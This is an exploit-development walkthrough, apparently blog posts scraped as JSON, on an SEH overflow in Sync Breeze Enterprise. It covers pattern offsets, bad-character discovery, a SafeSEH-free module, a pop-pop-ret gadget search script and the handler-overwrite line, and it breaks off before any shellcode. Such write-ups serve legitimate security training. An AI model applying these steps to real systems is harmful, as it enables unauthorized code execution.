our payload. during a vanilla stack overflow, the attacker overwrites a return address, and consequently the eip register, with the address of an instruction (like “jmp esp”) that can redirect the execution flow to the stack, where a payload is stored. however, in this scenario we do not control the stack when we gain control of the instruction pointer. let\u0026rsquo;s inspect esp when we change the eip:\n0:010\u0026gt; t eax=00000000 ebx=00000000 ecx=41414141 edx=77316270 esi=00000000 edi=00000000 eip=77316250 esp=0175f444 ebp=0175f460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 ntdll!executehandler2+0x24: 77316250 ffd1 call ecx {41414141} 0:010\u0026gt; dds esp l8 0175f444 0175f540 0175f448 0175ff44 0175f44c 0175f55c 0175f450 0175f4cc 0175f454 0175fe0c 0175f458 77316270 ntdll!executehandler2+0x44 0175f45c 0175ff44 0175f460 0175f528 but let\u0026rsquo;s inspect the four argument passed to the _except_handler function before calling it:\ntypedef exception_disposition _except_handler (*pexception_routine) ( in pexception_record exceptionrecord, in void establisherframe, in out pcontext contextrecord, in out pdispatcher_context dispatchercontext ); the argument of interest is the establisherframe argument, which is a pointer to the _exception_registration_record structure used to handle the exception. remember we managed to overwrite the two parameters of this structure!\n0:007\u0026gt; dt _exception_registration_record 0090fe0c ntdll!_exception_registration_record +0x000 next : 0x0090ff44 _exception_registration_record +0x004 handler : 0x1008df5b _exception_disposition libpal!md5_starts+0 0:007\u0026gt; dt _exception_registration_record 0090ff44 ntdll!_exception_registration_record +0x000 next : 0x41414141 _exception_registration_record +0x004 handler : 0x41414141 _exception_disposition +41414141 so if we managed to overwrite this structure, let\u0026rsquo;s inspect how many bytes we managed to overwrite starting from such structure\u0026rsquo;s address:\n0:010\u0026gt; !teb teb at 00286000 exceptionlist: 0175f454 stackbase: 01760000 stacklimit: 0175e000 subsystemtib: 00000000 fiberdata: 00001e00 arbitraryuserpointer: 00000000 self: 00286000 environmentpointer: 00000000 clientid: 000016cc . 00000f30 rpchandle: 00000000 tls storage: 0050a108 peb address: 00279000 lasterrorvalue: 0 laststatusvalue: c000000d count owned locks: 0 harderrormode: 0 0:010\u0026gt; dt _exception_registration_record 0175f454 ntdll!_exception_registration_record +0x000 next : 0x0175fe0c _exception_registration_record +0x004 handler : 0x77316270 _exception_disposition ntdll!executehandler2+0 0:010\u0026gt; dt _exception_registration_record 0x0175fe0c ntdll!_exception_registration_record +0x000 next : 0x0175ff44 _exception_registration_record +0x004 handler : 0x0094df5b _exception_disposition libpal!md5_starts+0 0:010\u0026gt; dt _exception_registration_record 0x0175ff44 ntdll!_exception_registration_record +0x000 next : 0x41414141 _exception_registration_record +0x004 handler : 0x41414141 _exception_disposition +41414141 0:010\u0026gt; dds 0x0175ff44 0175ff44 41414141 0175ff48 41414141 0175ff4c 41414141 0175ff50 41414141 0175ff54 41414141 0175ff58 41414141 0175ff5c 41414141 0175ff60 41414141 0175ff64 41414141 0175ff68 41414141 0175ff6c 41414141 0175ff70 41414141 0175ff74 41414141 0175ff78 41414141 0175ff7c 41414141 0175ff80 41414141 0175ff84 41414141 0175ff88 41414141 0175ff8c 41414141 0175ff90 41414141 0175ff94 41414141 0175ff98 41414141 0175ff9c 41414141 0175ffa0 41414141 0175ffa4 41414141 0175ffa8 41414141 0175ffac 41414141 0175ffb0 41414141 0175ffb4 41414141 0175ffb8 41414141 0175ffbc 41414141 0175ffc0 41414141 as we can see, the pointer to our _exception_registration_record stores an address to where our payload is located! we did not only override those bytes, but more bytes! so the same buffer that we used to overwrite the _exception_registration_record to modify the eip is the same that we will use to store our payload.\nlet\u0026rsquo;s locate the section where we put the parameters of executehandler2 to see where our paramter of interest is located:\n0:010\u0026gt; u @eip l11 ntdll!executehandler2: 7731622c 55 push ebp 7731622d 8bec mov ebp,esp 7731622f ff750c push dword ptr [ebp+0ch] 77316232 52 push edx 77316233 64ff3500000000 push dword ptr fs:[0] 7731623a 64892500000000 mov dword ptr fs:[0],esp 77316241 ff7514 push dword ptr [ebp+14h] 77316244 ff7510 push dword ptr [ebp+10h] 77316247 ff750c push dword ptr [ebp+0ch] // this is the establisherframe address 7731624a ff7508 push dword ptr [ebp+8] 7731624d 8b4d18 mov ecx,dword ptr [ebp+18h] 77316250 ffd1 call ecx // this ends calling 0x41414141, our handler function! 77316252 648b2500000000 mov esp,dword ptr fs:[0] 77316259 648f0500000000 pop dword ptr fs:[0] 77316260 8be5 mov esp,ebp 77316262 5d pop ebp 77316263 c21400 ret 14h indeed, if we inspect that address, we will find that is is the location of our shellcode:\n0:010\u0026gt; t eax=00000000 ebx=00000000 ecx=6fdb73da edx=77316270 esi=00000000 edi=00000000 eip=77316247 esp=0175f44c ebp=0175f460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 ntdll!executehandler2+0x1b: 77316247 ff750c push dword ptr [ebp+0ch] ss:0023:0175f46c=0175ff44 let\u0026rsquo;s see the contents of ebp+0ch:\n0:010\u0026gt; dds ebp+0xc 0175f46c 0175ff44 we can see that the address of our _exception_registration_record is there. the other parameters are also ebp offsets, but we are not interested.\nonce that we know that such address is the one we want to redirect the execution flow, we could overwrite the exception handler with the address of an instruction that returns into the establisherframe address on the stack, so that our code is executed. the most common sequence of instructions used in seh overflows to accomplish this task is “pop r32, pop r32, ret”, in which we pop the return address and the exceptionrecord argument from the stack into two arbitrary registers (r32) and then execute a ret operation to return into the establisherframe. this is because we pushed the last argument, before the \u0026ldquo;call ecx\u0026rdquo; instruction. the call instruction pushes in the stack the return address, so would have to pop the return address and the last argument to have the establisherframe address in the top of the stack, so we can perform a ret to this address and redirect the flow.\n","title":""},{"date":"0001-01-01","image":"","imageAlt":"","link":"http://localhost:1313/posts/osed_seh_2/","summary":"\u003ch1 id=\"our-first-seh-overflow-exploit-step-by-step\"\u003eOur first SEH overflow exploit, step by step\u003c/h1\u003e\n\u003cp\u003eLet\u0026rsquo;s start supposing that we already know that our input buffer crashes the program and somehow reaches any of the \u003ccode\u003e_EXCEPTION_REGISTRATION_RECORD\u003c/code\u003e structures.\nLet\u0026rsquo;s create a pattern in KALI to see the length of our buffer until it reaches the structure:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emsf-pattern_create -l \u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e              \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eLet\u0026rsquo;s paste this pattern and send this next to the headers needed so our payload is processed. Sending only this payload is useless as we want the program to process the input.\nWith 1000 characters, the program crashes:\u003c/p\u003e","tags":[],"text":"our first seh overflow exploit, step by step let\u0026rsquo;s start supposing that we already know that our input buffer crashes the program and somehow reaches any of the _exception_registration_record structures. let\u0026rsquo;s create a pattern in kali to see the length of our buffer until it reaches the structure:\nmsf-pattern_create -l 1000 aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9af0af1af2af3af4af5af6af7af8af9ag0ag1ag2ag3ag4ag5ag6ag7ag8ag9ah0ah1ah2ah3ah4ah5ah6ah7ah8ah9ai0ai1ai2ai3ai4ai5ai6ai7ai8ai9aj0aj1aj2aj3aj4aj5aj6aj7aj8aj9ak0ak1ak2ak3ak4ak5ak6ak7ak8ak9al0al1al2al3al4al5al6al7al8al9am0am1am2am3am4am5am6am7am8am9an0an1an2an3an4an5an6an7an8an9ao0ao1ao2ao3ao4ao5ao6ao7ao8ao9ap0ap1ap2ap3ap4ap5ap6ap7ap8ap9aq0aq1aq2aq3aq4aq5aq6aq7aq8aq9ar0ar1ar2ar3ar4ar5ar6ar7ar8ar9as0as1as2as3as4as5as6as7as8as9at0at1at2at3at4at5at6at7at8at9au0au1au2au3au4au5au6au7au8au9av0av1av2av3av4av5av6av7av8av9aw0aw1aw2aw3aw4aw5aw6aw7aw8aw9ax0ax1ax2ax3ax4ax5ax6ax7ax8ax9ay0ay1ay2ay3ay4ay5ay6ay7ay8ay9az0az1az2az3az4az5az6az7az8az9ba0ba1ba2ba3ba4ba5ba6ba7ba8ba9bb0bb1bb2bb3bb4bb5bb6bb7bb8bb9bc0bc1bc2bc3bc4bc5bc6bc7bc8bc9bd0bd1bd2bd3bd4bd5bd6bd7bd8bd9be0be1be2be3be4be5be6be7be8be9bf0bf1bf2bf3bf4bf5bf6bf7bf8bf9bg0bg1bg2bg3bg4bg5bg6bg7bg8bg9bh0bh1bh2b let\u0026rsquo;s paste this pattern and send this next to the headers needed so our payload is processed. sending only this payload is useless as we want the program to process the input. with 1000 characters, the program crashes:\n(1794.19f0): access violation - code c0000005 (first chance) first chance exceptions are reported before any exception handling. this exception may be expected and handled. *** warning: unable to verify checksum for c:\\program files\\sync breeze enterprise\\bin\\libpal.dll eax=63413163 ebx=00affa0c ecx=00afff08 edx=00aff9c4 esi=00afff08 edi=00affb10 eip=00932a9d esp=00aff998 ebp=00affeb8 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 libpal!sca_configobj::deserialize+0x1d: 00932a9d ff5024 call dword ptr [eax+24h] ds:0023:63413187=???????? we need to see at what address does our exception_registration_record structures point to. let\u0026rsquo;s list the exception chains:\n0:009\u0026gt; !exchain 00affe0c: libpal!md5_starts+149fb (009adf5b) 00afff44: 33654132 invalid exception stack at 65413165 0:009\u0026gt; !teb teb at 00366000 exceptionlist: 00affe0c stackbase: 00b00000 stacklimit: 00aff000 subsystemtib: 00000000 fiberdata: 00001e00 arbitraryuserpointer: 00000000 self: 00366000 environmentpointer: 00000000 clientid: 00001794 . 000019f0 rpchandle: 00000000 tls storage: 00587898 peb address: 00354000 lasterrorvalue: 0 laststatusvalue: c000000d count owned locks: 0 harderrormode: 0 0:009\u0026gt; dt _exception_registration_record 00affe0c ntdll!_exception_registration_record +0x000 next : 0x00afff44 _exception_registration_record +0x004 handler : 0x009adf5b _exception_disposition libpal!md5_starts+0 0:009\u0026gt; dt _exception_registration_record 00afff44 ntdll!_exception_registration_record +0x000 next : 0x65413165 _exception_registration_record +0x004 handler : 0x33654132 _exception_disposition +33654132 we can see that the second record generated an error:\nthe \u0026ldquo;next\u0026rdquo; pointer points to an invalid address (65413165), which gives an invalid exception stack error. the handler is also overwritten as it is placed after the \u0026ldquo;next\u0026rdquo; parameter in the stack. let\u0026rsquo;s verify that both values have been overwritten with our buffer: msf-pattern_offset -l 1000 -q 33654132 [*] exact match at offset 128 msf-pattern_offset -l 1000 -q 0x65413165 [*] exact match at offset 124 we can see that we managed to overwrite both values. so our payload is 128 bytes (in order to overwrite both values). let\u0026rsquo;s put 124 \u0026ldquo;a\u0026rdquo;, 4 \u0026ldquo;b\u0026rdquo; (which will overwrite the next value) and another 4 \u0026ldquo;c\u0026rdquo; (which will overwrite the handler value).\n0:009\u0026gt; !teb teb at 00382000 exceptionlist: 0185fe14 stackbase: 01860000 stacklimit: 0185f000 subsystemtib: 00000000 fiberdata: 00001e00 arbitraryuserpointer: 00000000 self: 00382000 environmentpointer: 00000000 clientid: 00001b28 . 00000828 rpchandle: 00000000 tls storage: 005fa6d8 peb address: 00376000 lasterrorvalue: 0 laststatusvalue: c000000d count owned locks: 0 harderrormode: 0 0:009\u0026gt; dt _exception_registration_record 0185fe14 ntdll!_exception_registration_record +0x000 next : 0x0185ff44 _exception_registration_record +0x004 handler : 0x0096dce3 _exception_disposition libpal!md5_starts+0 0:009\u0026gt; dt _exception_registration_record 0185ff44 ntdll!_exception_registration_record +0x000 next : 0x42424242 _exception_registration_record +0x004 handler : 0x43434343 _exception_disposition +43434343 as we can see, we managed to overwrite both values. we want to overwrite only the \u0026ldquo;handler\u0026rdquo; value so we will add 128 bytes (the next 4 will overwrite the handle address).\nlet\u0026rsquo;s continue by deleting the bad characters. update the payload to add the badchars after the 128 bytes. also, let\u0026rsquo;s add more bytes so the overflow is triggered (at this point i don\u0026rsquo;t know why, but, when adding the badchars after the 128 bytes that previously crashed the binary, it does not crash anymore. i guess it\u0026rsquo;s because of the badchars. we have to add more bytes after the badchars so it crashes and we can inspect badchars) once we have updated the payload, we have to inspect the part of the stack where our payload is stored. if we remember, the same location where the exception_registration_record pointed to is where the payload is stored. let\u0026rsquo;s check:\n0:008\u0026gt; !teb teb at 00224000 exceptionlist: 0171fe0c stackbase: 01720000 stacklimit: 0171f000 subsystemtib: 00000000 fiberdata: 00001e00 arbitraryuserpointer: 00000000 self: 00224000 environmentpointer: 00000000 clientid: 00000630 . 00000ce4 rpchandle: 00000000 tls storage: 00629628 peb address: 00219000 lasterrorvalue: 0 laststatusvalue: c000000d count owned locks: 0 harderrormode: 0 0:008\u0026gt; dt _exception_registration_record 0171fe0c ntdll!_exception_registration_record +0x000 next : 0x0171ff44 _exception_registration_record +0x004 handler : 0x0089df5b _exception_disposition libpal!md5_starts+0 let\u0026rsquo;s access the address of such record which is fully overwritten:\n0:008\u0026gt; dds 0x0171ff44 0171ff44 41414141 0171ff48 42424242 0171ff4c 00000001 0171ff50 008507ec libpal!sca_tcpserver::commandcallback+0xdc 0171ff54 00853e10 libpal!sca_winfile::operator=+0xe50 after the payload we se a \u0026ldquo;0000001\u0026rdquo; value, let\u0026rsquo;s inspect what happened:\n0:008\u0026gt; db 0x0171ff44 0171ff44 41 41 41 41 42 42 42 42-01 00 00 00 ec 07 85 00 aaaabbbb........ 0171ff54 10 3e 85 00 f8 5f df 00-72 40 85 00 c0 ed bc 00 .\u0026gt;..._..r@...... 0171ff64 f8 5f df 00 24 3e 85 00-c0 ed bc 00 10 3e 85 00 ._..$\u0026gt;.......\u0026gt;.. 0171ff74 29 d8 07 76 f8 5f df 00-10 d8 07 76 dc ff 71 01 )..v._.....v..q. 0171ff84 4d 25 05 77 f8 5f df 00-dc df 5e e0 00 00 00 00 m%.w._....^..... 0171ff94 00 00 00 00 f8 5f df 00-00 00 00 00 00 00 00 00 ....._.......... 0171ffa4 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0171ffb4 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ we can see that the payload is truncated after the \u0026ldquo;01\u0026rdquo; byte, which means that the \u0026ldquo;02\u0026rdquo; byte is a badchar. repeating this process leads us to the following badchars: 0x00, 0x02, 0x0a, 0x0d, 0xf8, 0xfd. for example, here i attach how i detected that 0x0a is also a badchar:\n0:008\u0026gt; !teb teb at 003cb000 exceptionlist: 0174fe0c stackbase: 01750000 stacklimit: 0174f000 subsystemtib: 00000000 fiberdata: 00001e00 arbitraryuserpointer: 00000000 self: 003cb000 environmentpointer: 00000000 clientid: 00001260 . 000018d0 rpchandle: 00000000 tls storage: 0052a988 peb address: 003c0000 lasterrorvalue: 0 laststatusvalue: c000000d count owned locks: 0 harderrormode: 0 0:008\u0026gt; dt _exception_registration_record 0174fe0c ntdll!_exception_registration_record +0x000 next : 0x0174ff44 _exception_registration_record +0x004 handler : 0x0096df5b _exception_disposition libpal!md5_starts+0 0:008\u0026gt; dd 0x0174ff44 l8 0174ff44 41414141 42424242 05040301 09080706 0174ff54 00923e00 00e25e18 00924072 00bfedc0 0:008\u0026gt; dds 0x0174ff44 l8 0174ff44 41414141 0174ff48 42424242 0174ff4c 05040301 0174ff50 09080706 0174ff54 00923e00 libpal!sca_winfile::operator=+0xe40 0174ff58 00e25e18 0174ff5c 00924072 libpal!sca_winfile::operator=+0x10b2 0174ff60 00bfedc0 0:008\u0026gt; db 0174ff4c 0174ff4c 01 03 04 05 06 07 08 09-00 3e 92 00 18 5e e2 00 .........\u0026gt;...^.. 0174ff5c 72 40 92 00 c0 ed bf 00-18 5e e2 00 24 3e 92 00 r@.......^..$\u0026gt;.. 0174ff6c c0 ed bf 00 10 3e 92 00-29 d8 07 76 18 5e e2 00 .....\u0026gt;..)..v.^.. 0174ff7c 10 d8 07 76 dc ff 74 01-4d 25 05 77 18 5e e2 00 ...v..t.m%.w.^.. 0174ff8c 24 19 dc 0e 00 00 00 00-00 00 00 00 18 5e e2 00 $............^.. 0174ff9c 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0174ffac 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0174ffbc 00 00 00 00 00 00 00 00-8c ff 74 01 00 00 00 00 ..........t..... after 09, the next byte should be 0a, but it\u0026rsquo;s 00.\nnow let\u0026rsquo;s find a module of the application that have addresses without badchars and also that has safeseh off. the idea is to bypass safeseh by exploiting a module that does not implement safeseh, leveraging the pop r32, pop r32, ret instruction sequence from a module that was compiled without the /safeseh.\nnote: in order for this exploit to be portable against multiple windows os, we have to locate a pop, pop, ret instruction sequence inside a module that is part of the vulnerable software.\nlet\u0026rsquo;s find the modules with the windbg narly extension. let\u0026rsquo;s load it and list the modules:\n0:008\u0026gt; .load narly __s|i}*!{a. ._s,aan2*a _wy1+~- )s, .ae\u0026#34;~=:...:x .vxl+:. -4c \u0026lt;2+=|==::..:d vvi=;.. -?o, =2=+==:::...=d )nv=:. )5, .2=--.......-=d ue+:: -*s \u0026lt;c . .=d m\u0026gt;==::.. ._, \u0026lt;s, )c :d #==viii|===; {xs=, -{s )c ..:d z;{nnonnvvii;v(-{%=. ~s, )e:====||iiv%=d x={oooonvvil;3; -{%, -*\u0026gt; )2\u0026lt;onnnnvnnnn\u0026gt;d x=)vvvviliii:3; -!s. :)s. )e\u0026lt;oonvllllliid x=\u0026lt;lllliii|=:n; -1c. +|1, )z\u0026lt;nvii||+|+|vx s=\u0026lt;lli|||=:: n; \u0026#34;nc -s%; )c=ovl|++==+=vo x=\u0026lt;i||+=; . .n` \u0026#34;1\u0026gt;.-{%i. )c\u0026lt;xnnli||++=vn x=iii\u0026gt;==-. :o` \u0026#34;1,:+ii,)c:sonnvli||=v( x\u0026gt;{ii+;:- .u( \u0026#34;o,-{iw(:nvvvllii=v2 s=i||;:. .=u( -!o,+i(:iiillii|ie` 2\u0026gt;v|==__su?` -?o,-:==||iisv\u0026#34; {nvni!\u0026#34;\u0026#34;~ -!sasvv}\u0026#34;\u0026#34;` by nephi johnson (d0c_s4vage) n for gnarly! available commands: !nmod - display /safeseh, /gs, dep, and aslr info for all loaded modules 0:008\u0026gt; !nmod 00400000 00463000 syncbrs /safeseh off c:\\program files\\sync breeze enterprise\\bin\\syncbrs.exe 00850000 00905000 libsync /safeseh off c:\\program files\\sync breeze enterprise\\bin\\libsync.dll 00910000 009e4000 libpal /safeseh off c:\\program files\\sync breeze enterprise\\bin\\libpal.dll 10000000 10226000 libspp /safeseh off c:\\program files\\sync breeze enterprise\\bin\\libspp.dll 69240000 69250000 wshbth /safeseh on /gs *aslr *dep c:\\windows\\system32\\wshbth.dll 69280000 69296000 pnrpnsp /safeseh on /gs *aslr *dep c:\\windows\\system32\\pnrpnsp.dll 692e0000 692f1000 napinsp /safeseh on /gs *aslr *dep c:\\windows\\system32\\napinsp.dll 69880000 6988e000 winrnr /safeseh on /gs *aslr *dep c:\\windows\\system32\\winrnr.dll 6a530000 6a5cf000 odbc32 /safeseh on /gs *aslr *dep c:\\windows\\system32\\odbc32.dll 6ab10000 6ab38000 winmm /safeseh on /gs *aslr *dep c:\\windows\\system32\\winmm.dll 6ac30000 6ac44000 netapi32 /safeseh on /gs *aslr *dep c:\\windows\\system32\\netapi32.dll 6acd0000 6ace9000 mpr /safeseh on /gs *aslr *dep c:\\windows\\system32\\mpr.dll 6dbe0000 6dbfd000 srvcli /safeseh on /gs *aslr *dep c:\\windows\\system32\\srvcli.dll 72780000 72796000 nlaapi /safeseh on /gs *aslr *dep c:\\windows\\system32\\nlaapi.dll 73610000 73c28000 windows_storage /safeseh on /gs *aslr *dep c:\\windows\\system32\\windows.storage.dll 74300000 74311000 wkscli /safeseh on /gs *aslr *dep c:\\windows\\system32\\wkscli.dll 74520000 74552000 iphlpapi /safeseh on /gs *aslr *dep c:\\windows\\system32\\iphlpapi.dll 74560000 745f0000 dnsapi /safeseh on /gs *aslr *dep c:\\windows\\system32\\dnsapi.dll 745f0000 745fb000 netutils /safeseh on /gs *aslr *dep c:\\windows\\system32\\netutils.dll 74790000 747e7000 mswsock /safeseh on /gs *aslr *dep c:\\windows\\system32\\mswsock.dll 749d0000 749f5000 wldp /safeseh on /gs *aslr *dep c:\\windows\\system32\\wldp.dll 74cb0000 74cb8000 dpapi /safeseh on /gs *aslr *dep c:\\windows\\system32\\dpapi.dll 74e00000 74e25000 sspicli /safeseh on /gs *aslr *dep c:\\windows\\system32\\sspicli.dll 74f10000 7514e000 kernelbase /safeseh on /gs *aslr *dep c:\\windows\\system32\\kernelbase.dll 75150000 75236000 gdi32full /safeseh on /gs *aslr *dep c:\\windows\\system32\\gdi32full.dll 75240000 7525b000 bcrypt /safeseh on /gs *aslr *dep c:\\windows\\system32\\bcrypt.dll 75260000 7535e000 crypt32 /safeseh on /gs *aslr *dep c:\\windows\\system32\\crypt32.dll 75450000 7546d000 win32u no_seh /gs *aslr *dep c:\\windows\\system32\\win32u.dll 75470000 754eb000 msvcp_win /safeseh on /gs *aslr *dep c:\\windows\\system32\\msvcp_win.dll 75540000 7557b000 cfgmgr32 /safeseh on /gs *aslr *dep c:\\windows\\system32\\cfgmgr32.dll 75580000 756a0000 ucrtbase /safeseh on /gs *aslr *dep c:\\windows\\system32\\ucrtbase.dll 75700000 757e3000 ole32 /safeseh on /gs *aslr *dep c:\\windows\\system32\\ole32.dll 75940000 75bc1000 combase /safeseh on /gs *aslr *dep c:\\windows\\system32\\combase.dll 75bd0000 7600b000 setupapi /safeseh on /gs *aslr *dep c:\\windows\\system32\\setupapi.dll 76010000 76055000 shlwapi /safeseh on /gs *aslr *dep c:\\windows\\system32\\shlwapi.dll 76060000 760fd000 kernel32 /safeseh on /gs *aslr *dep c:\\windows\\system32\\kernel32.dll 76100000 76187000 shcore /safeseh on /gs *aslr *dep c:\\windows\\system32\\shcore.dll 76190000 76226000 oleaut32 /safeseh on /gs *aslr *dep c:\\windows\\system32\\oleaut32.dll 76230000 762f3000 rpcrt4 /safeseh on /gs *aslr *dep c:\\windows\\system32\\rpcrt4.dll 763e0000 763e7000 nsi no_seh /gs *aslr *dep c:\\windows\\system32\\nsi.dll 76560000 76b39000 shell32 /safeseh on /gs *aslr *dep c:\\windows\\system32\\shell32.dll 76b40000 76bff000 msvcrt /safeseh on /gs *aslr *dep c:\\windows\\system32\\msvcrt.dll 76c00000 76c77000 sechost /safeseh on /gs *aslr *dep c:\\windows\\system32\\sechost.dll 76c80000 76ce3000 ws2_32 /safeseh on /gs *aslr *dep c:\\windows\\system32\\ws2_32.dll 76cf0000 76d12000 gdi32 no_seh /gs *aslr *dep c:\\windows\\system32\\gdi32.dll 76e20000 76e9d000 advapi32 /safeseh on /gs *aslr *dep c:\\windows\\system32\\advapi32.dll 76ea0000 76ea6000 psapi no_seh /gs *aslr *dep c:\\windows\\system32\\psapi.dll 76eb0000 77027000 user32 /safeseh on /gs *aslr *dep c:\\windows\\system32\\user32.dll 77030000 771cf000 ntdll /safeseh on /gs *aslr *dep c:\\windows\\system32\\ntdll.dll there are several modules. however, the libspp.dll application dll is a perfect candidate. it is compiled without any protections and is loaded in a memory range which does not contain null bytes. we will use a windbg script to search for a pop32, pop32, ret instruction. we will use a classic windbg. narly did also give us the memory region of the library.\nwe want to gather all the possible opcodes of the pop instructions for each available register. we don\u0026rsquo;t want to perform a \u0026ldquo;pop esp\u0026rdquo; as this will modify the esp, the stack pointer, and disrupt the stack frame. the rest of the register are fine for us. let\u0026rsquo;s find all the opcodes:\nmsf-nasm_shell nasm \u0026gt; pop eax 00000000 58 pop eax nasm \u0026gt; pop ebx 00000000 5b pop ebx nasm \u0026gt; pop ecx 00000000 59 pop ecx nasm \u0026gt; pop edx 00000000 5a pop edx nasm \u0026gt; pop esi 00000000 5e pop esi nasm \u0026gt; pop edi 00000000 5f pop edi nasm \u0026gt; pop ebp 00000000 5d pop ebp nasm \u0026gt; ret 00000000 c3 ret nasm \u0026gt; we can see that all the \u0026ldquo;pop\u0026rdquo; instruction start from opcode 58 to 5d. ret opcode is c3. with this information, we will execute a windbg script that will search around the base address of the module we want to search for these instructions, and find a pop, pop, ret, instruction:\n.block { .for (r $t0 = 0x58; $t0 \u0026lt; 0x5f; r $t0 = $t0 + 0x01) { .for (r $t1 = 0x58; $t1 \u0026lt; 0x5f; r $t1 = $t1 + 0x01) { s-[1]b 10000000 10226000 $t0 $t1 c3 } } } let\u0026rsquo;s execute this script in windbg: remember to replace the address range of the module! the results are that there are several chains of these instructions:\n0:009\u0026gt; $\u0026gt;\u0026lt;c:\\users\\user\\desktop\\find_ppr.wds 0x1015a2f0 0x100087dd 0x10008808 0x1000881a 0x10008829 0x1001bb8a 0x1001bc1f 0x100491e4 0x1006ef94 0x1006ef9b 0x1008922a 0x10089280 0x1008971d 0x10089748 0x1008975a 0x10089769 0x10089ddb 0x10089e01 0x1008a717 0x1008a7a3 0x1008b063 0x1008b082 0x1008b0e5 0x1008b0f8 0x1008b9f9 0x1008ba7f 0x1008bb8c 0x1008bb95 0x1009a662 0x1009af98 0x100a4bdb let\u0026rsquo;s see that, for example, the first one, points to a valid chain, check that there is no pop esp before using this! and also check that the address does not have badchars!\n0:009\u0026gt; u 0x1015a2f0 l3 libspp!pcre_exec+0x16460: 1015a2f0 58 pop eax 1015a2f1 5b pop ebx 1015a2f2 c3 ret each pop is in a different register, but as we said, it does not mind for now. so, let\u0026rsquo;s update the exploit so that the seh handler structure points to this address: 0x1015a2f0 to do this easy, we can use the \u0026ldquo;pack\u0026rdquo; library to represent this address in little endian:\ninputbuffer+= pack(\u0026#34;\u0026lt;l\u0026#34;, (0x1015a2f0)) # overwrite seh address with pop eax; pop ebx; ret and if we send the payload and see the handlers, we see that the handler has been modified to the 0x1015a2f0 address.\n0:010\u0026gt; !teb teb at 003c6000 exceptionlist: 008dfe0c stackbase: 008e0000 stacklimit: 008df000 subsystemtib: 00000000 fiberdata: 00001e00 arbitraryuserpointer: 00000000 self: 003c6000 environmentpointer: 00000000 clientid: 0000091c . 0000124c rpchandle: 00000000 tls storage: 00608320 peb address: 003b5000 lasterrorvalue: 0 laststatusvalue: c000000d count owned locks: 0 harderrormode: 0 0:010\u0026gt; dt _exception_registration_record 008dfe0c ntdll!_exception_registration_record +0x000 next : 0x008dff44 _exception_registration_record +0x004 handler : 0x0096df5b _exception_disposition libpal!md5_starts+0 0:010\u0026gt; dt _exception_registration_record 0x008dff44 ntdll!_exception_registration_record +0x000 next : 0x41414141 _exception_registration_record +0x004 handler : 0x1015a2f0 _exception_disposition libspp!pcre_exec+0 0:010\u0026gt; u 0x1015a2f0 l3 libspp!pcre_exec+0x16460: 1015a2f0 58 pop eax 1015a2f1 5b pop ebx 1015a2f2 c3 ret now, let\u0026rsquo;s examine what will happen: there will be 